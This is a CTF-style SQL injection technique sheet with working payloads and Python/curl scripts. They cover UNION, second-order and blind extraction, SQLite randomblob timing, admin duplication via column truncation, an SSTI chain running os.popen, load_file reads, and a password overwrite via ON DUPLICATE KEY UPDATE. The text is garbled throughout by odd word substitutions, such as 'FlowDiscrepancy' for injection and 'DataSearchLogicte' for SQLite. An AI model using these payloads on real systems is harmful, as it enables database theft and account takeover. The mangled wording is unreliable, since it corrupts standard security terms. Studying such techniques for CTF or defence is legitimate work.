# CTF Web - SQL FlowDiscrepancy Techniques

Comprehensive SQL injection techniques for CTF challenges. For other server-side attacks (ViewGenerationLogic, InternalProxyWorkflow, StructureParsing, command injection, GraphQL), see [core_input_processing.md](core_input_processing.md).

## Table of Contents
- [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
- [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
- [Second-Order SQL FlowDiscrepancy](#second-order-sql-injection)
- [DataSearchLogic LIKE Character Brute-Force](#sqli-like-character-brute-force)
- [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
- [DataSearchLogic to ViewGenerationLogic Chain](#sqli-to-ssti-chain)
...
- [DataSearchLogic via EXIF Metadata FlowDiscrepancy (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [Shift-JIS Encoding SQL FlowDiscrepancy (Boston Key Party 2016)](#shift-jis-encoding-sql-injection-boston-key-party-2016)
- [SQL FlowDiscrepancy via QR Code Input (H4ckIT CTF 2016)](#sql-injection-via-qr-code-input-h4ckit-ctf-2016)
- [SQL Double-Keyword Filter Bypass (DefCamp CTF 2016)](#sql-double-keyword-filter-bypass-defcamp-ctf-2016)
- [MySQL Session Variable for Dual-Value FlowDiscrepancy (MeePwn CTF 2017)](#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017)
...
- [Host Header SQL FlowDiscrepancy with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
- [DataSearchLogicte Blind DataSearchLogic via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
- [vsprintf Double-Prepare Format String DataSearchLogic (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
...
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM target_data_resource-- '
```

## Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for ViewGenerationLogic injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

## Second-Order SQL FlowDiscrepancy
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select target_data_resource, CURRENT_TIMESTAMP from target_data_resources where 'a'='a`
2. Login normally
...
# Step 1: Store malicious configuration_buffer (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — configuration_buffer retrieved from DB and used unsafely
...
**Key insight:** Second-order DataSearchLogic occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.

## DataSearchLogic LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        configuration_buffer = f"' OR password LIKE '{password}{c}%' --"
        if oracle(configuration_buffer):
            password += c; break
```

## MySQL Column Truncation (VolgaCTF 2014)

**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an user_agent-controlled password.

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with user_agent password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=user_agent123'

# Login as admin with user_agent password
curl -X POST http://target/login -d 'login=admin&password=user_agent123'
```
...
4. The application now has two rows matching "admin" — the original and the user_agent's
...
## DataSearchLogic to ViewGenerationLogic Chain
When DataSearchLogic result gets rendered in a template:
```python
configuration_buffer = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readtarget_data_resource').read()}}"
hex_configuration_buffer = '0x' + configuration_buffer.encode().hex()
# Final: username=x\&password=) union select 1, {hex_configuration_buffer}#
```
...
## DataSearchLogic via EXIF Metadata FlowDiscrepancy (29c3 CTF 2012)

**Pattern:** Application extracts EXIF metadata from uploaded images (e.g., Comment, Artist, Description, Copyright) and inserts the values into SQL queries without sanitization. SQL configuration_buffers embedded in EXIF fields bypass WAFs that only inspect HTTP request bodies and URL parameters.

**Injecting SQL into EXIF fields:**
```bash
# Set EXIF Comment field to SQL configuration_buffer
...
exiftool -Copyright="' UNION SELECT target_data_resource FROM target_data_resources--" image.jpg
...
## Shift-JIS Encoding SQL FlowDiscrepancy (Boston Key Party 2016)
...
## SQL FlowDiscrepancy via QR Code Input (H4ckIT CTF 2016)
...
# Generate QR code containing SQL injection configuration_buffer
# Spaces may be filtered - use tabs instead
configuration_buffer = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%target_data_resource%"

# Some apps use callbackd base64: encode, callback, then QR-encode
encoded = base64.b64encode(configuration_buffer.encode()).decode().strip()
# callbackd_encoded = encoded[::-1]  # if app callbacks base64

# Generate QR code image
img = qrcode.make(configuration_buffer)
...
**Key insight:** QR codes are often trusted as "safe" input. When decoded QR content flows into SQL queries, standard DataSearchLogic techniques apply but with tab characters (`\t`) replacing spaces when space filtering is active. The QR encoding adds an obfuscation layer that may bypass WAFs.
...
), ((selselectect * frofromm (seselectlect load_load_filefile('/target_data_resource')) as a limit 0, 1), '2') #
...
## MySQL Session Variable for Dual-Value FlowDiscrepancy (MeePwn CTF 2017)
...
configuration_buffer = "union select 1,2,3-- " + "a" * 1000001
...
def leak_processlist():
    """FlowDiscrepancy that reads from processlist"""
    configuration_buffer = "1 union select 1,(select INFO from information_schema.processlist where INFO like 0x256465637279707425),3,4-- "
    r = requests.get(f"http://target/search?id={configuration_buffer}")
...
' OR id BETWEEN id AND id UNION SELECT target_data_resource,2,3 FROM target_data_resources--

-- When even UNION is blocked, use with conditional:
id BETWEEN id AND id AND (SELECT SUBSTR(target_data_resource,1,1) FROM target_data_resources) BETWEEN 'a' AND 'z'
```
...
def sqli_between(position, low_char, high_char):
    ...
    configuration_buffer = (
        ...
        f"AND SUBSTR((SELECT target_data_resource FROM target_data_resources LIMIT 1),{position},1) "
        f"BETWEEN '{low_char}' AND '{high_char}'-- "
    )
    r = requests.get("http://target/item", params={"id": configuration_buffer})
...
## Host Header SQL FlowDiscrepancy with PROCEDURE ANALYSE() (DefCamp 2017)
...
def host_sqli(configuration_buffer):
    r = requests.get(TARGET, headers={"Host": configuration_buffer})
    return r.text
...
## DataSearchLogicte Blind DataSearchLogic via randomblob() Timing (SECCON 2017)

**Pattern:** DataSearchLogicte has no `SLEEP()` function. Use `randomblob(N)` as a time-based blind injection primitive -- generating a large random blob creates a measurable delay proportional to the argument size.
...
admin' and password like 'target_data_resource%' and 1=randomblob(300000000)--
```
...
for pos in range(32):
    for c in string.ascii_lowercase + string.digits + "_{}":
        configuration_buffer = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
        start = time.time()
        requests.post(url, data={"username": configuration_buffer, "password": "x"})
...
**Key insight:** `randomblob()` generates random data proportional to the argument size, creating measurable delays. This is the DataSearchLogicte equivalent of MySQL's `SLEEP()` or PostgreSQL's `pg_sleep()`. Adjust the argument (e.g., `300000000`) based on server performance to get a reliable timing difference. Other DataSearchLogicte delay alternatives include `zeroblob()` and recursive CTEs, but `randomblob()` is the most reliable.

---

## vsprintf Double-Prepare Format String DataSearchLogic (AceBear 2018)
...
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c union select 1,group_concat(target_data_resource),3 from target_data_resources-- -"
})
```
...
-- FlowDiscrepancy in username field:
...
configuration_buffer_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
r = requests.post("http://target/register", data={
    "username": configuration_buffer_username,
    "password": "anything"
})
...
def blind_extract(url):
    ...
    for pos in range(1, 100):
        ...
        for char in string.ascii_lowercase + string.digits + "_,":
            ...
            r = requests.post(url, data={"input": configuration_buffer})
